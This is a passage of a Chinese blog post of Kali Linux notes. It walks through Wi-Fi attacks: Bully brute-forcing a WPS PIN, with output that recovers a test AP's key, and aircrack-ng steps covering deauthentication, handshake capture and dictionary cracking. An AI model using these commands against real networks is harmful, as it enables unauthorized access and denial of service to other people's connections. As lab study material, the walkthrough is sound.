+</div><div class="notel-content"><p>root@daxueba:~#  bully –bssid 14:e6:e4:84:23:7a wlan0mon -c 1<br>[!] Bully v1.1 - WPS vulnerability assessment utility<br>[P] Modified for pixiewps by AAnarchYY(<a class="link"   href="mailto:&#97;&#x61;&#x6e;&#97;&#114;&#99;&#x68;&#x79;&#121;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#99;&#x6f;&#x6d;" >&#97;&#x61;&#x6e;&#97;&#114;&#99;&#x68;&#x79;&#121;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#99;&#x6f;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>[+] Switching interface ‘wlan0mon’ to channel ‘1’<br>[!] Using ‘00:0f:00:8d:a6:e2’ for the source MAC address<br>[+] Datalink type set to ‘127’, radiotap headers present<br>[+] Scanning for beacon from ‘14:e6:e4:84:23:7a’ on channel ‘1’<br>[!] Excessive (3) FCS failures while reading next packet<br>[!] Excessive (3) FCS failures while reading next packet<br>[!] Excessive (3) FCS failures while reading next packet<br>[!] Disabling FCS validation (assuming –nofcs)<br>[+] Got beacon for ‘Test’ (14:e6:e4:84:23:7a)<br>[!] Creating new randomized pin file ‘&#x2F;root&#x2F;.bully&#x2F;pins’<br>[+] Index of starting pin number is ‘0000000’<br>[+] Last State &#x3D; ‘NoAssoc’   Next pin ‘97011347’<br>[!] Received disassociation&#x2F;deauthentication from the AP<br>[+] Rx(M2D&#x2F;M3) &#x3D; ‘NoAssoc’   Next pin ‘97011347’<br>[!] Unexpected packet received when waiting for EAP Req Id<br>[!] &gt;000012002e48000000026c09a000e301000008023a01000f008da6e214e6e48423<br>7a14e6e484237a2000aaaa03000000888e0200008001de0080fe00372a000000010400104a0001101022000107103900107e4f501a655e05fb5360a4a9dcbb71e710140020d60dd09ac834bc24853d62c2603764d495c5922910f1bffe61ad9ba89625295910150020977b1c91a3df55b132817cc9d22e8196e361b6b179ee0fa41124897b2a7667b710050008acd9d60ed01a2236&lt;<br>[+] Rx(  ID  ) &#x3D; ‘EAPFail’   Next pin ‘97011347’<br>[!] Received disassociation&#x2F;deauthentication from the AP<br>[+] Rx( Assn ) &#x3D; ‘NoAssoc’   Next pin ‘97011347’</p>
+</div></div>
+
+<p>从输出的信息可以看到，正在尝试暴力破解目标AP的PIN码，当破解成功后，将显示如下类似的信息：</p>
+<div class="note-large red"><div class="notel-title"><p>Bully攻击流程-2</p>
+</div><div class="notel-content"><p>[+] Rx(  ID  ) &#x3D; ‘EAPFail’   Next pin ‘98874019’<br>[+] Rx( Assn ) &#x3D; ‘Timeout’   Next pin ‘98874019’<br>[+] Rx(M2D&#x2F;M3) &#x3D; ‘Timeout’   Next pin ‘98874019’<br>[!] Unexpected packet received when waiting for EAP Req Id<br>[!] &gt;00001a002f48000036164fc40500000010028509a000f001000008023a0100e04c<br>81c11014e6e484237a14e6e484237a2000aaaa03000000888e0200008001c80080fe00372a000000010400104a00011010220001071039001078c42434621449aa65f773b8fe1dea5d101400202eea8e7be64d88e401dfa116452edf8427aeb7985af884bd699a5fa0761759c110150020e2ef0681fab497cbb0ca37ca127af08a15c025100757a64cb73fd46c01976913100500081adaf460796cfd38352c6570&lt;<br>[+] Rx(  ID  ) &#x3D; ‘EAPFail’   Next pin ‘98874019’<br>[*] Pin is ‘98874019’, key is ‘daxueba!’<br>Saved session to ‘&#x2F;root&#x2F;.bully&#x2F;14e6e484237a.run’<br>        PIN : ‘98874019’<br>        KEY : ‘daxueba!’</p>
+</div></div>
+
+<p>以上输出信息中可以看到破解出了Test的密码，其中，PIN码为98870419，密钥为daxueba!</p>
+<p>PS：<br>Bully会在3到5个小时内破解出WPS PIN和AP密码。</p>
+<p>推荐：⭐⭐ 不是非常推荐</p>
+<h2 id="蓝牙-无线攻击工具"><a href="#蓝牙-无线攻击工具" class="headerlink" title="蓝牙&amp;&amp;无线攻击工具"></a>蓝牙&amp;&amp;无线攻击工具</h2><h3 id="aircrack-ng"><a href="#aircrack-ng" class="headerlink" title="aircrack-ng"></a>aircrack-ng</h3><p>Aircrack-ng是一款用于无线网络渗透测试的工具，它可以扫描无线网络、捕获数据包、破解密码等。</p>
+<p>个人实验成功的攻击为WAP加密</p>
+<p>首先将无线网卡插入电脑并选择连接虚拟机中的kali</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/05-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>之后输入命令</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ iwconfig</span><br></pre></td></tr></table></figure></div>
+<p>查看无线网卡有没有加载成功，发现存在无线网卡wlan0，目前wlan0没有连接到任何的wifi上，这个Wlan0中没有IP地址就说明它现在不在连接中。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/06-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>激活无线网卡至monitor既监听模式</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0    </span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/07-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>获取当前网络概况:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0    </span><br></pre></td></tr></table></figure></div>
+<p>其中 wlan0 是监听模式的接口名称</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/08-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>如果说后续不成功建议使用命令</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng check <span class="built_in">kill</span> </span><br></pre></td></tr></table></figure></div>
+<p>删除多余不必要的内容</p>
+<p>airodump-nq命令详解：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ BSSID显示目标网络的MAC地址</span><br><span class="line">$ PWR显示网络的信号强度。数字越高，信号越好</span><br><span class="line">$ Beacons是网络发送的帧，以便广播它的存在</span><br><span class="line">$ <span class="comment">#Data表示数据包的数量或数据帧的数量</span></span><br><span class="line">$ <span class="comment">#/s显示在过去10秒内收集的数据包的数量</span></span><br><span class="line">$ CH显示网络工作的频道</span><br><span class="line">$ ENC显示网络使用的加密。它可以是WEP，OPN，WPA，WPA2CIPHER显示网络中使用的密码</span><br><span class="line">$ AUTH显示网络上使用的身份验证</span><br><span class="line">$ ESSID显示网络的名称</span><br></pre></td></tr></table></figure></div>
+<p>选择目标网络并进行记录信息<br>例如：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/09-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>其中记录其MAC地址以及信道号<br>MAC地址：BSSID: 80:EA:07:A5:09:FF<br>工作信道:CH:11</p>
+<p>启动数据包捕获</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon</span><br></pre></td></tr></table></figure></div>
+<p>其中“[channel]”是目标网络的信道号，“[BSSID]”是目标网络的MAC地址，“capture”是保存捕获数据包的文件名，这个可以进行修改。</p>
+<p>使用以下命令对目标网络进行攻击</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 10 -a [BSSID] wlan0mon</span><br></pre></td></tr></table></figure></div>
+<p>其中，“-0”表示进行Deauthentication攻击，“10”表示发送10个Deauthentication帧，“[BSSID]”是目标网络的MAC地址。</p>
+<p>-0为模式中的一种：冲突攻击模式，后面跟发送次数（设置为0，则为循环攻击，不停的断开连接，客户端无法正常上网，-a 指定无线AP的mac地址，即为该无线网的bssid值</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/10-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>在右上角可以看到WPA handshake字样，后面跟着bssid，即为抓到了该无线网的握手包，我们可以使用CTRL+C来停止嗅探握手包。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/11-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>等待一段时间后，Aircrack-ng将会捕获足够的数据包以进行密码破解。</p>
+<p>使用密码本进行密码破解</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w [dictionary-file] capture-01.cap</span><br></pre></td></tr></table></figure></div>
+<p>其中，“[dictionary-file]”是用于破解密码的字典文件名，“capture-01.cap”是捕获的数据包文件名。<br>之后等待结果</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/12-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/Kali-Linux/06-WA/13-kali-WA.jpg"
+                      alt="KL 图片"
+                ></p>
+<p>推荐：⭐⭐ 不是非常推荐</p>
+<h2 id="总推荐指数"><a href="#总推荐指数" class="headerlink" title="总推荐指数"></a>总推荐指数</h2><p>推荐：⭐  不推荐</p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/Kali-Attack/">#Kali-Attack</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/01/04/LD-BugFixes/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Web常见漏洞描述及修复建议</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/11/13/0-Kl-tool/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Kali-Linux-Tools-安装以及基础操作</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">Kali-Linux-Tools-无线攻击-(1)</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kali-%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D"><span class="nav-text">Kali-无线攻击介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kali-linux-8821cu-%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E5%AE%89%E8%A3%85"><span class="nav-text">Kali-linux 8821cu-无线网卡安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%93%9D%E7%89%99%E5%B7%A5%E5%85%B7%E9%9B%86"><span class="nav-text">蓝牙工具集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#spooftooph-%E8%93%9D%E7%89%99%E8%AE%BE%E5%A4%87%E4%BC%AA%E9%80%A0%E5%85%8B%E9%9A%86%E5%B7%A5%E5%85%B7"><span class="nav-text">spooftooph-蓝牙设备伪造克隆工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E7%BA%BF%E5%B7%A5%E5%85%B7%E9%9B%86"><span class="nav-text">无线工具集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bully"><span class="nav-text">bully</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%93%9D%E7%89%99-%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7"><span class="nav-text">蓝牙&amp;&amp;无线攻击工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#aircrack-ng"><span class="nav-text">aircrack-ng</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E6%8E%A8%E8%8D%90%E6%8C%87%E6%95%B0"><span class="nav-text">总推荐指数</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">Farewell good hunter, May you find your worth in the waking world.</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">变化无常</a>
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.4.4</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex justify-center items-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+        ],
+        containers: ["#swup"],
+    });
+
+    swup.hooks.on("page:view", () => {
+        Global.refresh();
+    });
+
+    // if (document.readyState === "complete") {
+    //
+    // } else {
+    //     document.addEventListener("DOMContentLoaded", () => init());
+    // }
+</script>
+
+
+
+
+
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
